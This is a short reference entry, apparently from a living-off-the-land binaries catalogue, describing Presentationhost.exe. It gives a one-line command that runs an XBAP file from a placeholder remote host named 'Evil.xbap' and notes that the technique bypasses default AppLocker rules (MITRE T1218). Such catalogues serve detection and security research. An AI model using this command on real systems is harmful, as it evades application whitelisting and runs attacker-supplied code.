## Presentationhost.exe
```

Presentationhost.exe file:///IPAddressOrDomainName/Evil.xbap
Executes the target XAML Browser Application (XBAP) file.
```
* Windows binary: True   
* Bypasses Default AppLocker Rules: True   
* Mitre: [T1218](https://attack.mitre.org/techniques/T1218/)   
   
* Links:   
  * https://medium.com/@jpg.inc.au/applocker-bypass-presentationhost-exe-8c87b2354cd4
  * https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf
  * https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
   
* File path:   
  * c:\windows\system32\PresentationHost.exe
  * c:\windows\sysWOW64\PresentationHost.exe
   
* Acknowledgement:   
  * Name: Josh Graham of TSS
    * Twitter: [@JPG1nc](https://twitter.com/@JPG1nc)
    * Blog: https://medium.com/@jpg.inc.au
  * Name: Casey Smith
    * Twitter: [@Subtee](https://twitter.com/@Subtee)
    * Blog: https://subt0x11.blogspot.com/
   
OS:  
- [x] Windows Server 2016
- [x] Windows 10 1803
